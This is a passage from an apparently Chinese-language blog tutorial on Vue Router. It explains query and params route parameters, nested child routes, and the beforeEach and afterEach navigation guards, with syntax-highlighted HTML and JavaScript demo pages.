class="xml">                        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">'goregister'</span>&gt;</span>我要去注册<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">'back'</span>&gt;</span>返回上一页<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`,</span></span></span><br><span class="line">            data()&#123;</span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span>&#123;&#125;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            methods:&#123;</span><br><span class="line">                goregister()&#123;</span><br><span class="line"><span class="actionscript">                    <span class="comment">//this.$router.push(&#123;path:'/register'&#125;)</span></span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">this</span>.$router.replace(&#123;path:<span class="string">'/register'</span>&#125;)</span></span><br><span class="line">                &#125;,</span><br><span class="line">                back()&#123;</span><br><span class="line"><span class="actionscript">                    <span class="keyword">this</span>.$router.go(<span class="number">-1</span>)</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="路由的传参和取参"><a href="#路由的传参和取参" class="headerlink" title="路由的传参和取参"></a>路由的传参和取参</h2><p><strong>查询参</strong><br>配置（传参） :to=”{name:’login’,query:{id:loginid}}”<br>获取（取参） this.$route.query.id<br><strong>路由参数</strong><br>配置（传参） :to=”{name:’register’,params:{id:registerid} }”<br>配置路由的规则 <strong>{ name:’detail’,path:’/detail/:id’}</strong><br>获取 this.$route.params.id<br><strong>总结：</strong><br>:to传参的属性里 params是和name配对的 query和name或path都可以<br><strong>使用路由参数必须要配置路由规则里面配置好参数名</strong>，否则刷新页面参数会丢失</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220145458.png" alt="image-20211220145456647"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220145531.png" alt="image-20211220145529705"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220145551.png" alt="image-20211220145550285"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220145851.png" alt="image-20211220145849787"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220145948.png" alt="image-20211220145947731"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220150123.png" alt="image-20211220150121750"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220150136.png" alt="image-20211220150134997"></p><p>获取参数还可以这样写</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220150603.png" alt="image-20211220150601666"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220150703.png" alt="image-20211220150701580"></p><h2 id="嵌套路由"><a href="#嵌套路由" class="headerlink" title="嵌套路由"></a>嵌套路由</h2><p>补充上一节知识点：js跳转路由传参和标签传参，路由相同而参数不同时页面不做刷新的问题<br>解决方案：<router-view :key="$route.fullPath"></router-view></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 坑位 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入路由插件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"vue-router.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Login=&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">            template:`<span class="tag">&lt;<span class="name">div</span>&gt;</span>我是登录页面，</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">span</span>&gt;</span>这是我获得到的参数：</span><span class="template-variable">&#123;&#123; msg &#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`,</span></span></span><br><span class="line">            data()&#123;</span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="actionscript">                    msg:<span class="string">''</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            created()&#123;</span><br><span class="line"><span class="actionscript">                <span class="keyword">this</span>.msg = <span class="keyword">this</span>.$route.query.id</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Register=&#123;</span></span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>我是注册页面<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">            `</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">// 安装路由插件</span></span></span><br><span class="line">        Vue.use(VueRouter);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">//创建路由对象</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> router = <span class="keyword">new</span> VueRouter(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//配置路由</span></span></span><br><span class="line">            routes:[</span><br><span class="line"><span class="actionscript">                &#123;path:<span class="string">'/login'</span>,name:<span class="string">'login'</span>,component:Login&#125;,</span></span><br><span class="line"><span class="actionscript">                &#123;path:<span class="string">'/register'</span>,name:<span class="string">'register'</span>,component:Register&#125;,</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="actionscript">        <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            el:<span class="string">'#app'</span>,</span></span><br><span class="line">            router,</span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123;name:'login',query:&#123;id:'123'&#125;&#125;"</span>&gt;</span>去登录<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span></span><br><span class="line">                    |</span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123;name:'register',params:&#123;foo:'bar'&#125;&#125;"</span>&gt;</span>去注册<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">'jslink'</span>&gt;</span>js跳转去登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-view</span> <span class="attr">:key</span>=<span class="string">"$route.fullPath"</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`,</span></span></span><br><span class="line">            data()&#123;</span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="actionscript">                    msg:<span class="string">''</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            methods:&#123;</span><br><span class="line">                jslink()&#123;</span><br><span class="line"><span class="actionscript">                    <span class="keyword">this</span>.$router.push(&#123;name:<span class="string">'login'</span>,query:&#123;id:<span class="string">'456'</span>&#125;&#125;)</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>代码思想<br>1:router-view的细分<br>router-view第一层中，包含一个router-view<br>2:每一个坑挖好了，要对应单独的组件<br>路由配置</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">routes: [</span><br><span class="line">           &#123;</span><br><span class="line">               path:'/nav',</span><br><span class="line">               name:'nav',</span><br><span class="line">               component:Nav,</span><br><span class="line">               //路由嵌套增加此属性</span><br><span class="line">               children:[</span><br><span class="line">               //在这里配置嵌套的子路由</span><br><span class="line">               ]</span><br><span class="line">           &#125;</span><br><span class="line">       ]</span><br></pre></td></tr></table></figure><p>案例</p><p>进入首页下面会有导航，个人中心、首页、资讯、我的之类的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 坑位 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入路由插件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"vue-router.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Nav = &#123;</span></span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123;name:'nav.index'&#125;"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span></span><br><span class="line">                    |</span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123;name:'nav.personal'&#125;"</span>&gt;</span>个人中心<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span></span><br><span class="line">                    |</span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123;name:'nav.message'&#125;"</span>&gt;</span>资讯<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span></span><br><span class="line">                    |</span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123;name:'nav.mine'&#125;"</span>&gt;</span>我的<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span></span><br><span class="line">                    </span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">            `</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Index=&#123;</span></span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">            `</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Personal=&#123;</span></span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>个人中心<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">            `</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Message=&#123;</span></span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>资讯<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">            `</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Mine=&#123;</span></span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>我的<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">            `</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="comment">// 安装路由插件</span></span></span><br><span class="line">        Vue.use(VueRouter);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">//创建路由对象</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> router = <span class="keyword">new</span> VueRouter(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//配置路由</span></span></span><br><span class="line">            routes:[</span><br><span class="line"><span class="actionscript">                &#123;path:<span class="string">'/nav'</span>,</span></span><br><span class="line"><span class="actionscript">                name:<span class="string">'nav'</span>,</span></span><br><span class="line">                component:Nav,</span><br><span class="line"><span class="actionscript">                <span class="comment">//嵌套路由增加这个属性</span></span></span><br><span class="line">                children:[</span><br><span class="line"><span class="actionscript">                    <span class="comment">//配置我们的嵌套路由</span></span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// &#123;path:'',redirect:'/nav/index'&#125;,</span></span></span><br><span class="line"><span class="actionscript">                    &#123;path:<span class="string">'index'</span>,name:<span class="string">'nav.index'</span>,component:Index&#125;,</span></span><br><span class="line"><span class="actionscript">                    &#123;path:<span class="string">'personal'</span>,name:<span class="string">'nav.personal'</span>,component:Personal&#125;,</span></span><br><span class="line"><span class="actionscript">                    &#123;path:<span class="string">'message'</span>,name:<span class="string">'nav.message'</span>,component:Message&#125;,</span></span><br><span class="line"><span class="actionscript">                    &#123;path:<span class="string">'mine'</span>,name:<span class="string">'nav.mine'</span>,component:Mine&#125;,</span></span><br><span class="line">                ]</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="actionscript">        <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            el:<span class="string">'#app'</span>,</span></span><br><span class="line">            router,</span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`,</span></span></span><br><span class="line">            data()&#123;</span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="actionscript">                    msg:<span class="string">''</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            methods:&#123;</span><br><span class="line">                jslink()&#123;</span><br><span class="line"><span class="actionscript">                    <span class="keyword">this</span>.$router.push(&#123;name:<span class="string">'login'</span>,query:&#123;id:<span class="string">'456'</span>&#125;&#125;)</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="路由守卫"><a href="#路由守卫" class="headerlink" title="路由守卫"></a>路由守卫</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const router &#x3D; new VueRouter(&#123; ... &#125;</span><br><span class="line">&#x2F;&#x2F;前置的钩子函数 最后要执行next（）才会跳转</span><br><span class="line">router.beforeEach((to, from, next) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;)</span><br><span class="line">&#x2F;&#x2F;后置的钩子函数 已经跳转了不需要next</span><br><span class="line">router.afterEach((to, from) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>主要是简单介绍一下，路由守卫主要用于检验是否登录了，没登录就跳转到登录页面不让他在其他页面停留，但是现在这种处理主要的都用请求的全局拦截来做了。大致了解一下路由守卫即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 坑位 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入路由插件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"vue-router.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Nav = &#123;</span></span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123;name:'nav.index'&#125;"</span>&gt;</span>首页<span 